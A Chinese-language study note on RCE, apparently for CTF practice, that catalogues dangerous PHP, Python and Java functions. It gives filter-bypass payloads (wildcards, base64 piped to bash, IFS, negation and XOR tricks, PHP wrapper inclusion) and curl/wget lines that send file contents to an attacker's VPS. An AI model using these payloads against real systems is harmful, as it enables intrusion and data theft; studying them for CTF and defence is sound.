#  RCE  
zoe
                    zoe  哦0吼   2026-02-01 14:17  
  
# 概念：  
  
RCE代码执行:引用脚本代码解析执行  
  
RCE命令执行:脚本调用操作系统命令漏洞函数  
  
PHP代码执行函数:  
  
eval (), assert () preg replace (), create function (), array map ().call user func (), call user func array (), array filter (), uasort ()等  
  
PHP命令执行函数:  
  
system (), exec () shell exec (), pcntl exec (), popen (), proc popen ()passthru()、等  
# 检测  
  
白盒  
 ：代码审计  
  
黑盒：  
漏扫工具、公开漏洞、手工测试（参数点 / 功能点注入）  
# （一）php命令执行函数  
  
system()  
	执行系统命令，直接输出结果	system('ls -l');  
  
exec()	执行系统命令，仅返回结果最后一行；可通过参数获取完整输出和返回状态	exec('ls -l', $output, $code);  
  
shell_exec()	执行系统命令，返回完整结果（无输出则返回 null）	$res = shell_exec('whoami');  
  
passthru()	执行系统命令，直接输出原始结果（适合二进制输出，如图片处理）	passthru('cat /etc/passwd');  
  
反引号（``）	shell_exec()的别名，功能完全一致	$res = ls -al;  
  
proc_open()	打开进程，通过管道与进程交互（更复杂的命令执行）	-  
# （二）php代码执行函数  
  
eval()  
	将字符串作为 PHP 代码执行，需以分号结尾	最常见的代码执行函数  
  
assert()  
	PHP 8.0 前可执行字符串代码（8.0 后仅支持断言表达式）	仅适用于低版本 PHP  
  
call_user_func()	调用指定函数，参数可控时可执行恶意代码	需配合函数名注入  
  
preg_replace()	带/e修饰符时，将替换结果作为代码执行（PHP 7.0 后已移除/e修饰符）  
  
create_function() 创建匿名函数，参数可控时注入恶意代码  
  
call_user_func()/call_user_func_array()动态调用指定函数，函数名 / 参数可控则触发  
  
array_map()/array_filter()数组回调函数，回调参数可控时执行恶意代码  
  
uasort()数组排序回调，回调参数可控触发  
### Python  
  
无严格区分代码 / 命令执行，核心危险函数直接触发 RCE：  
1. 代码执行：eval()、exec()（exec 可执行多行代码，风险更高）  
  
1. 命令执行：os.system()、subprocess模块（subprocess.call()/subprocess.Popen()）、commands（Python3 已废弃）  
  
### Java  
  
无直接的字符串转代码执行函数  
（如 PHP 的 eval），RCE 通过间接机制实现：  
  
反射机制：动态加载类、调用方法，参数可控时执行恶意逻辑  
  
表达式引擎：基于反射的 OGNL、SpEL、MVEL 等，表达式参数可控时触发  
  
命令执行：Runtime.getRuntime().exec()、ProcessBuilder，调用系统命令  
# 管道符  
### window支持的管道符：  
  
|    :直接执行后面的语句  
  
||    :如果前面执行的语句出错,则执行后面的语句,前面的语句只能为假。  
  
“&”:如果前面的语句为假,则直接执行后面的语句,前面的语句可真可假。  
  
“&&”:如果前面的语句为假，则直接出错，也不执行后面的语句，前面的语句只能为真。  
### Linux支持的管道符：  
  
； ：执行完前面的语句再执行后面的  
  
|    :显示后面语句的执行结果。  
  
||    :当前面的语句执行出错时，执行后面的语句。  
  
“&”:如果前面的语句为假,则直接执行后面的语句,前面的语句可真可假。  
  
“&&”:如果前面的语句为假，则直接出错，也不执行后面的，前面的语句只能为真。  
  
>/>> :重定向 >覆盖写入文件，>>追加写入文件  
  
2>&1  :将错误输出（2）重定向到标准输出（1），用于无回显利用  
# 可用字符筛选脚本（PHP）  
  
遍历 ASCII32-127，筛选出非字母数字、非特殊过滤符号  
的可用字符，为位运算绕过提供基础：  
```
<?php
// 过滤规则可根据实际场景修改（如保留!@#等）
for ($i=32;$i<127;$i++){
    if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",chr($i))){
        echo chr($i)."  "; // 输出可用字符
    }
}
?>
```  
###   
# 绕过技巧  
### 1. 关键词过滤  
  
利用通配符匹配模糊关键字  
，适用于部分字符被过滤的情况：  
  
*：匹配任意长度字符，例：cat fl*（匹配 flag/flag.php）、tac fla*.ph*  
  
?：匹配单个字符，例：cat ?la?（匹配 flag）  
  
转移/分隔绕过  
  
通过符号拆分被过滤的关键字，系统解析时会自动拼接：  
  
反斜杠转义：ca\t /fl\ag  
  
单引号分隔：cat fl''ag（两个单引号中间无字符，解析为原字符）  
  
空变量绕过  
  
利用系统空变量（$*/$@/$5/${x}，x 为任意未定义变量）拆分关键字，变量解析为空：  
  
eg：cas$*t fl$@ag、cas${x}t f$5lag、cas(2)t f$(2)lag  
  
变量拼接绕过  
  
将被过滤的命令 / 关键字拆分为多个变量，再拼接执行  
```
a=fl;b=ag;cat $IFS$a$b

$a='sy';$b='stem';

$a$b('ls');
```  
  
编码绕过  
  
eg：写成base64  
  
# whoami的Base64编码：d2hvYW1p  
  
echo  
'd2hvYW1p'  
|  
 base64   
-d  
|  
bash  
  
# 读取flag：echo ZmxhZwo= | base64 -d 得到flag，再拼接执行  
  
cat  
`echo ZmxhZwo= | base64 -d`  
  
文件拼接执行  
  
通过创建特殊文件，利用ls -t按时间排序拼接成完整命令，写入文件后执行（适用于关键字被完全过滤）：  
```
# 创建带换行的文件（\表示换行，文件内容为单个字符+换行）
touch "ca\\"  # 内容：ca+换行
touch "t \\"   # 内容：t+换行
touch "fl\\"   # 内容：fl+换行
touch "ag"     # 内容：ag
# ls -t 按创建时间倒序输出，拼接为cat flag，写入shell文件
ls -t > shell
# 执行拼接后的命令
sh shell
```  
### 2、函数/命令过滤  
  
//   
替代system('ls')  
，适用于过滤system关键字  
  
echo `ls`;        # 反引号=shell_exec()  
  
echo $(ls);       # 内敛执行，同反引号  
  
<?= `ls`; ?>      # PHP短标签，等价于<?php echo `ls`; ?>  
  
<?= $(ls); ?>     # 内敛执行+短标签  
  
替换cat  
  
tac:从最后一行开始显示，可以看出 tac是 cat的反向显示  
  
more:一页一页的显示档案内容  
  
less:与 more 类似  
  
head:查看头几行  
  
tail:查看尾几行  
  
nl:显示文件和行号  
  
od:以二进制的方式读取档案内容  
  
sort:排序时间显示文件内容  
  
uniq :去重时间显示文件内容  
  
file -f:报错出具体内容  
  
sh 报错出文件内容  sh flag.php 2>&1  
  
vi/vim  
  
strings提取文件中的可打印字符  
  
rev  反转文件内容后显示  
  
curl   利用 file 协议读取文件        curl file:///root/flag  
### 3、空格过滤绕过（Linux）  
  
${IFS}：  
内部字段分隔符环境变量  
  
示例：cat${IFS}/etc/passwd  
  
$IFS$9：  
$IFS+ 位置参数（$9通常为空）  
  
示例：cat$IFS$9/etc/passwd  
  
%09：  
URL 编码的制表符（ASCII=9）  
  
示例：cat%09/etc/passwd（GET 参数中使用）  
  
逗号/括号分隔：  
部分系统 / 命令支持，例：(cat,flag)、ls,-l  
  
变量拼接  
：例：a=flag;cat$a  
### 4.取反绕过（~）  
  
<?php  
  
echo urlencode(~'phpinfo');  
  
?>  
  
得到取反的结果：%8F%97%8F%96%91%99%90  
  
例如phpinfo()就是：  
  
(~'%8F%97%8F%96%91%99%90')();  
  
对需要使用的函数进行取反，然后再进行URL 编码；在发送 payload 的时候将其取反，便可还原代码；  
  
NSSCTF[SWPUCTF 2021 新生赛]hardrce（无字母RCE）-CSDN博客  
### 5.异或绕过(^)  
  
原理：两个非字母数字字符（ASCII32-127）异或，得到目标字母 / 数字字符  
  
生成脚本（Python）：遍历所有 ASCII 字符，输出异或组合，筛选非字母数字的组合：  
```
def xor_bypass(target):
    # target为目标字符串，如'system'
    for char in target:
        target_ascii = ord(char)
        for i in range(32, 127):
            for j in range(32, 127):
                if i ^ j == target_ascii:
                    # 筛选非字母数字的字符（可根据过滤规则调整）
                    if not (chr(i).isalnum() or chr(j).isalnum()):
                        print(f"{chr(i)} ^ {chr(j)} = {char}")
xor_bypass('system')

```  
  
利用方式：('%01'^'%73').('%02'^'%79')... → 拼接为 system 后执行  
### 6.无回显绕过  
  
将命令执行结果输出到可访问的位置，或通过外带方式获取  
#### 1. 本地写文件后访问（适用于有 Web 目录写入权限）  
  
将命令结果写入 Web 根目录的文件，通过浏览器直接访问查看：  
```
// PHP命令执行中，将ls结果写入1.txt，访问http://x.x.x.x/1.txt
system('ls / > /var/www/html/1.txt');
// Linux直接执行
echo `cat /flag` > /var/www/html/flag.txt

```  
#### 2. 外带数据（适用于无本地写入权限，核心）  
  
通过curl/wget  
将结果发送到自己的 VPS（公网可访问），实现跨服务器获取数据：  
```
# 方法1：curl发送（将flag内容作为参数发送到VPS的80端口）
cat /flag | curl -X POST -d @- http://你的VPSIP:80/
# 方法2：wget发送（将flag内容写入VPS的flag.txt文件）
wget http://你的VPSIP:80/?flag=`cat /flag`
```  
### 7、无参数函数绕过  
#### 1. 核心无参数函数（必须掌握）  
<table><thead><tr><th style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">函数</span></p></th><th style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf=""><br/></span></p></th></tr></thead><tfoot><tr><td></td></tr></tfoot><colgroup><col width="399"/><col width="399"/></colgroup></table><table><tbody><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">getallheaders()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">获取 HTTP 请求头，返回关联数组</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">get_defined_vars()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">获取当前所有已定义变量，返回多维数组</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">session_id()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">获取 / 设置 SessionID，可通过 Cookie 传入可控值</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">getcwd()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">返回当前工作目录（绝对路径）</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">scandir()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">列出指定目录的文件 / 目录，返回数组</span></p></td></tr></tbody></table>  
#### 2. 配套辅助函数（组合使用）  
<table><thead><tr><th style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">函数</span></p></th><th style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><section><span leaf=""><br/></span></section></th></tr></thead><tfoot><tr><td></td></tr></tfoot><colgroup><col width="399"/><col width="399"/></colgroup></table><table><tbody><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">current()/pos()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">返回数组第一个元素（pos 是 current 别名）</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">end()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">返回数组最后一个元素</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">next()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">移动数组指针，返回下一个元素</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">implode()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">将一维数组转为字符串</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">readfile()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">直接输出文件内容（读取文件核心）</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">dirname()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">返回路径的目录部分</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">chdir()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">改变当前工作目录</span></p></td></tr><tr><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">localeconv()</span></p></td><td style="display: table-cell;background-color: rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;background-color: rgba(0, 0, 0, 0);"><p data-editor="true"><span leaf="">返回本地格式信息数组，固定包含&#34;.&#34;（关键锚点）</span></p></td></tr></tbody></table>  
#### 3. 经典组合示例（读取当前目录最后一个文件）  
```
// 核心逻辑：localeconv()取. → scandir(getcwd())遍历目录 → end()取最后一个文件 → readfile()输出
readfile(end(scandir(getcwd())));
// 完整无参数组合（过滤.时）
readfile(end(scandir(dirname(getcwd()))));
```  
# 伪协议配合RCE（PHP 文件包含 + 代码执行）  
### 1. 执行代码：data:// 伪协议  
  
将自定义 PHP 代码  
以字符串形式传递，被包含时直接执行，实现无文件 RCE：  
```
// 漏洞代码：include $_GET['a'];
// 利用方式：传入base64编码的PHP代码（避免特殊字符转义）
?a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8=
// 解码后：<?php system('ls');?>，直接执行系统命令

```  
### 2. 读取文件：php://filter 伪协议  
  
加密读取文件内容  
（Base64），绕过文件内容过滤（如 PHP 标签、特殊字符），读取后本地解码即可：  
```
// 漏洞代码：include $_GET['a'];
// 利用方式：读取flag.php并以Base64编码输出
?a=php://filter/read=convert.base64-encode/resource=flag.php
// 输出结果为Base64字符串，解码后得到flag.php原内容

```  
### 3. 执行 POST 代码：php://input 伪协议  
  
将PHP 代码通过 POST 请求体传递  
，被包含时执行，适用于 GET 参数过滤严格的场景：  
```
// 漏洞代码：include $_GET['a'];
// GET参数：?a=php://input
// POST请求体（直接写PHP代码）：<?php system('tac flag.php');?>
```  
  
  
总结rce（远程代码执行各种sao姿势）绕过bypass_远程命令执行绕过-CSDN博客  
#   
  
  
  
  
